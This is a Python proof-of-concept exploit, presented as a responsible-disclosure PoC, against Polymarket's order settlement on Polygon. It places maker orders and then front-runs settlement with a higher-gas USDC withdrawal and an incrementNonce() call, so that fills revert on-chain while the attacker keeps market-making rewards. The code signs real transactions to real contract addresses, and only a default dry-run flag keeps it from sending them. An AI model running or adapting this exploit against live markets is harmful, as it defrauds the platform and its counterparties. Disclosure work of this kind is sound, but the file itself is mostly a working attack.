"""
PoC: Polymarket incrementNonce Ghost Fill Exploit (Disclosure Only)

This strategy demonstrates how an attacker can farm market-making rewards
on Polymarket by placing orders that get filled off-chain but never settle
on-chain. The attacker front-runs the operator's match settlement by sending
an incrementNonce() or USDC withdrawal transaction with higher gas.

THIS IS A PROOF OF CONCEPT FOR RESPONSIBLE DISCLOSURE TO POLYMARKET.
DO NOT USE ON MAINNET WITH REAL FUNDS.

Exploit flow:
    1. Place maker order on CLOB (earns MM reward when filled)
    2. Order gets matched off-chain — API reports fill
    3. Before on-chain settlement, fire BOTH:
       a. Transfer USDC out of proxy wallet (drain collateral)
       b. incrementNonce() on CTFExchange (invalidate signing nonce)
       Either alone is sufficient; both together maximize revert likelihood.
    4. On-chain settlement reverts (stale nonce AND insufficient balance)
    5. Attacker keeps MM reward credit, counterparty gets ghost fill
    6. Repeat

References:
    - https://x.com/TheNotoriousSKi/status/2025367455816929468
    - https://github.com/TheOneWhoBurns/polymarket-nonce-guard
"""

import time
from typing import Any, Dict, Optional

from eth_abi import encode as abi_encode
from web3 import Web3

from ..exchanges.polymarket import Polymarket
from ..models import Market
from ..models.order import OrderSide, OrderTimeInForce
from ..utils import setup_logger

logger = setup_logger(__name__)

# CTFExchange contract on Polygon
CTF_EXCHANGE = "0x4bFb41d5B3570DeFd03C39a9A4D8dE6Bd8B8982E"
# incrementNonce() function selector
INCREMENT_NONCE_SELECTOR = "0x627cdcb9"
# USDC on Polygon
USDC_ADDRESS = "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174"
# ERC20 transfer(address,uint256) selector
TRANSFER_SELECTOR = "0xa9059cbb"


class NonceFrontrunPoC:
    """
    PoC strategy that demonstrates the incrementNonce ghost fill exploit.

    Approach used here: withdraw USDC from the proxy wallet with higher gas
    so the settlement tx fails due to insufficient collateral.

    Args:
        exchange: Authenticated Polymarket exchange instance
        market: Target market to place orders on
        gas_multiplier: How much to multiply the base gas price for front-running
        order_size: Size of maker orders in USD
        dry_run: If True, log actions without sending transactions (default: True)
    """

    def __init__(
        self,
        exchange: Polymarket,
        market: Market,
        gas_multiplier: float = 3.0,
        order_size: float = 5.0,
        dry_run: bool = True,
    ):
        self.exchange = exchange
        self.market = market
        self.gas_multiplier = gas_multiplier
        self.order_size = order_size
        self.dry_run = dry_run

        # Web3 for direct on-chain txns
        rpc_url = exchange.config.get("rpc_url", Polymarket.POLYGON_RPC_URL)
        self.w3 = Web3(Web3.HTTPProvider(rpc_url))

        # EOA private key (for sending frontrun tx directly, not via relayer)
        self.private_key = exchange.private_key
        if not self.private_key:
            raise ValueError("Private key required for PoC")

        pk = self.private_key if not self.private_key.startswith("0x") else self.private_key[2:]
        from eth_account import Account

        self.account = Account.from_key(pk)
        self.eoa_address = self.account.address

        # Proxy wallet (Safe) address
        self.proxy_wallet = exchange.funder
        if not self.proxy_wallet:
            raise ValueError("Funder (proxy wallet) address required")

        logger.info(f"NonceFrontrunPoC initialized (dry_run={dry_run})")
        logger.info(f"  EOA: {self.eoa_address}")
        logger.info(f"  Proxy: {self.proxy_wallet}")
        logger.info(f"  Market: {market.question[:60]}...")
        logger.info(f"  Gas multiplier: {gas_multiplier}x")

    def _get_juiced_gas_price(self) -> int:
        """Get current gas price multiplied by gas_multiplier for front-running."""
        try:
            base_gas = self.w3.eth.gas_price
        except Exception:
            # Fallback for dry-run when RPC is unavailable
            base_gas = 30_000_000_000  # 30 gwei default
        juiced = int(base_gas * self.gas_multiplier)
        logger.info(f"  Base gas: {base_gas / 1e9:.1f} gwei -> Juiced: {juiced / 1e9:.1f} gwei")
        return juiced

    def _get_eoa_nonce(self) -> int:
        """Get EOA transaction nonce, with fallback for dry-run."""
        try:
            return self.w3.eth.get_transaction_count(self.eoa_address)
        except Exception:
            return 0

    def _build_increment_nonce_tx(self, nonce_offset: int = 0) -> Dict[str, Any]:
        """Build an incrementNonce() transaction to the CTFExchange."""
        gas_price = self._get_juiced_gas_price()
        nonce = self._get_eoa_nonce() + nonce_offset

        tx = {
            "to": Web3.to_checksum_address(CTF_EXCHANGE),
            "data": INCREMENT_NONCE_SELECTOR,
            "gas": 50_000,
            "gasPrice": gas_price,
            "nonce": nonce,
            "chainId": 137,
        }
        return tx

    def _build_usdc_withdraw_tx(
        self, amount_wei: int, recipient: str, nonce_offset: int = 0
    ) -> Dict[str, Any]:
        """
        Build a USDC transfer from proxy wallet to recipient.

        Withdraws USDC so the proxy wallet has insufficient balance
        when settlement lands.
        """
        gas_price = self._get_juiced_gas_price()
        nonce = self._get_eoa_nonce() + nonce_offset

        # ERC20 transfer(address,uint256) calldata
        transfer_data = (
            TRANSFER_SELECTOR
            + abi_encode(
                ["address", "uint256"],
                [Web3.to_checksum_address(recipient), amount_wei],
            ).hex()
        )

        tx = {
            "to": Web3.to_checksum_address(USDC_ADDRESS),
            "data": transfer_data,
            "gas": 80_000,
            "gasPrice": gas_price,
            "nonce": nonce,
            "chainId": 137,
        }
        return tx

    def _send_frontrun_tx(self, tx: Dict[str, Any]) -> Optional[str]:
        """Sign and send a frontrun transaction. Returns tx hash."""
        if self.dry_run:
            logger.info(f"  [DRY RUN] Would send tx to {tx['to']}")
            logger.info(f"  [DRY RUN] Data: {tx['data'][:20]}...")
            logger.info(f"  [DRY RUN] Gas price: {tx['gasPrice'] / 1e9:.1f} gwei")
            return None

        signed = self.account.sign_transaction(tx)
        tx_hash = self.w3.eth.send_raw_transaction(signed.raw_transaction)
        hex_hash = tx_hash.hex()
        logger.info(f"  Frontrun tx sent: {hex_hash}")
        return hex_hash

    def place_maker_order(self, side: OrderSide, price: float) -> Optional[str]:
        """
        Place a maker order on the CLOB that earns MM rewards when filled.

        Returns order ID if successful.
        """
        token_id = self.exchange._resolve_token_id(self.market, outcome=0)

        if self.dry_run:
            logger.info(f"  [DRY RUN] Would place {side.value} order: {self.order_size} @ {price}")
            return "dry-run-order-id"

        order = self.exchange.create_order(
            market_id=self.market.id,
            outcome="Yes",
            side=side,
            price=price,
            size=self.order_size,
            params={"token_id": token_id},
            time_in_force=OrderTimeInForce.GTC,
        )
        logger.info(f"  Order placed: {order.id} ({side.value} {self.order_size} @ {price})")
        return order.id

    def run_single_cycle(self):
        """
        Run one exploit cycle:
        1. Place maker order at market mid price
        2. Wait for fill
        3. Front-run settlement with BOTH USDC withdrawal AND incrementNonce
        """
        logger.info(f"\n{'=' * 60}")
        logger.info("EXPLOIT CYCLE START")
        logger.info(f"{'=' * 60}")

        # Step 1: Get current market price and place maker order
        logger.info("\n[Step 1] Placing maker order...")
        orderbook = self.exchange.fetch_orderbook(self.market)
        if not orderbook:
            logger.error("Failed to fetch orderbook")
            return

        best_bid = orderbook.get("best_bid", 0.5)
        best_ask = orderbook.get("best_ask", 0.5)
        mid = (best_bid + best_ask) / 2
        logger.info(f"  Market: bid={best_bid:.4f} ask={best_ask:.4f} mid={mid:.4f}")

        # Place order slightly better than best bid to get filled quickly
        maker_price = round(min(best_bid + 0.01, mid), 2)
        self.place_maker_order(OrderSide.BUY, maker_price)

        # Step 2: Monitor for fill (in production this would use websocket)
        logger.info("\n[Step 2] Waiting for fill...")
        logger.info("  (In production: monitor user WS channel for fill event)")
        logger.info("  (Simulating fill detection after 2s)")
        time.sleep(2)

        # Step 3: Front-run settlement with BOTH vectors
        logger.info("\n[Step 3] Front-running settlement...")

        # 3a. Drain USDC from proxy wallet so settlement has no collateral
        logger.info("\n  [3a] Withdrawing USDC from proxy wallet...")
        amount_wei = int(self.order_size * 1e6)  # USDC has 6 decimals
        usdc_tx = self._build_usdc_withdraw_tx(amount_wei, self.eoa_address, nonce_offset=0)
        self._send_frontrun_tx(usdc_tx)
        logger.info("  USDC withdrawal sent — proxy wallet drained for settlement")

        # 3b. Increment nonce to invalidate the signed order (nonce_offset=1
        # because the USDC tx already claimed the current EOA nonce)
        logger.info("\n  [3b] Incrementing CTFExchange nonce...")
        nonce_tx = self._build_increment_nonce_tx(nonce_offset=1)
        self._send_frontrun_tx(nonce_tx)
        logger.info("  incrementNonce() sent — all pending orders invalidated")

        # Step 4: Result
        logger.info("\n[Step 4] Result:")
        logger.info("  - Maker order was filled off-chain (MM reward credited)")
        logger.info("  - USDC drained: settlement fails due to insufficient balance")
        logger.info("  - Nonce incremented: settlement fails due to stale signature")
        logger.info("  - Counterparty receives ghost fill")
        logger.info("  - Attacker keeps reward, no risk exposure")
        logger.info(f"\n{'=' * 60}")
        logger.info("EXPLOIT CYCLE END")
        logger.info(f"{'=' * 60}\n")

    def run(self, cycles: int = 1, delay: float = 5.0):
        """
        Run multiple exploit cycles. Each cycle fires both USDC withdrawal
        and incrementNonce before settlement lands.

        Args:
            cycles: Number of cycles to run
            delay: Seconds between cycles
        """
        logger.info(f"Starting NonceFrontrunPoC: {cycles} cycles")
        logger.info(f"DRY RUN MODE: {self.dry_run}")

        for i in range(cycles):
            logger.info(f"\n--- Cycle {i + 1}/{cycles} ---")
            self.run_single_cycle()
            if i < cycles - 1:
                logger.info(f"Waiting {delay}s before next cycle...")
                time.sleep(delay)

        logger.info("\nPoC complete.")
